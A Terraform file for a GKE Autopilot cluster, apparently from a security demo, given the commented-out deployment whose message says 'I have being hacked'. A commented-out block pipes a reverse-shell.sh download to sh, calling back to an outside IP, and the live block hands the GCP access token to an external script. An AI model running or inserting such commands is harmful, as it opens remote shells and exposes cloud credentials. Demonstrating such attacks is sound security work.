# data "external" "test" {
#   program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
# }



data "external" "test" {
  depends_on = [ data.google_client_config.provider,data.google_container_cluster.my_cluster ]
  program = ["sh", "get_pods.sh"]

  query = {
    host                   = "https://${data.google_container_cluster.my_cluster.endpoint}"
    token                  = data.google_client_config.current.access_token
    cluster_ca_certificate = base64decode(data.google_container_cluster.my_cluster.master_auth[0].cluster_ca_certificate)
  }
}

output "pods_output" {
  value = data.external.test.result
}


data "google_client_config" "provider" {}

data "google_container_cluster" "my_cluster" {
  name     = "my-autopilot"
  location = var.region
}

# provider "kubernetes" {
#   host  = "https://${data.google_container_cluster.my_cluster.endpoint}"
#   token = data.google_client_config.provider.access_token
#   cluster_ca_certificate = base64decode(
#     data.google_container_cluster.my_cluster.master_auth[0].cluster_ca_certificate,
#   )
# }

# resource "kubernetes_deployment" "webapp_deployment" {
#   metadata {
#     name = "webapp-deployment1"
#   }

#   spec {
#     replicas = 1
#     selector {
#       match_labels = {
#         app = "webapp1"
#       }
#     }

#     strategy {
#       type = "Recreate"
#     }

#     template {
#       metadata {
#         labels = {
#           app = "webapp1"
#         }
#       }

#       spec {
#         container {
#           name  = "webapp1"
#           image = "europe-west1-docker.pkg.dev/rare-phoenix-413915/my-repository/web-app-1:latest"
#           port {
#             container_port = 5000
#           }

#           env {
#             name  = "IMAGE"
#             value = "2-sad"
#           }

#           env {
#             name  = "MESSAGE"
#             value = "I am Demo1 and I have being hacked!!!"
#           }

#           image_pull_policy = "Always"
#         }
#       }
#     }
#   }
# }
